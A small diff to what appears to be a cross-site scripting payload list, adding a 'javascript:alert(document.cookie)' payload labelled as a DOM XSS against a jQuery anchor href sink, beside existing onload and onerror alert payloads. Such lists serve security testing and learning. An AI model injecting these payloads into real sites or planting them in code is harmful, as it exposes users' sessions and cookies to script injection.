@@ -686,6 +686,8 @@ XSS
 "  onload="alert(String.fromCharCode(88,83,83))
 " onload="alert('XSS')
 <img src='bla' onerror=alert("XSS")>
+javascript:alert(document.cookie) --> DOM XSS in jQuery anchor href attribute sink using location.search source
+
 
       Mario Bros XSS
          <iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
